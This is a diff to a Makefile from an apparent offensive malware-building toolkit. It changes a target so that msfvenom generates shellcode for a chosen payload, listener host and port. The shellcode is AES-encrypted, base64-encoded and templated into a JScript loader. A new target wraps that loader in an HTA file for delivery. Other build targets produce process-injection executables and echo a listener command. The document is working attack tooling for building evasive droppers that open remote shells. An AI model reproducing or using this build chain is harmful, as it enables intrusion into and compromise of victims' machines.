@@ -41,12 +41,16 @@ process_inject.exe: sources/process_inject.cs
 	mcs -out:process_inject.exe sources/process_inject.cs
 	@echo $(LISTENER_CMD)
 
-dotnet.js: templates/process.js
+loader.js: templates/loader.js
 	export KEY=$$(uuidgen | tr -d "-"); \
 	export IV=$$(uuidgen | tr -d "-"); \
 	export BASE64_SHELLCODE=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f raw | openssl enc -aes-128-cbc -K $$KEY -iv $$IV -nosalt | base64 -w0); \
-	cat templates/process.js | envsubst > dotnet.js
+	cat templates/loader.js | envsubst > loader.js
 	@echo $(LISTENER_CMD)
+
+loader.hta: loader.js templates/loader.hta
+	export JSCRIPT=$$(cat loader.js); \
+	cat templates/loader.hta | envsubst > loader.hta
 
 clean:
 	rm -rf \
@@ -54,4 +58,5 @@ clean:
 		classic.exe \
 		classic_aes.exe \
 		process_inject.exe \
-		dotnet.js
+		loader.js \
+		loader.hta
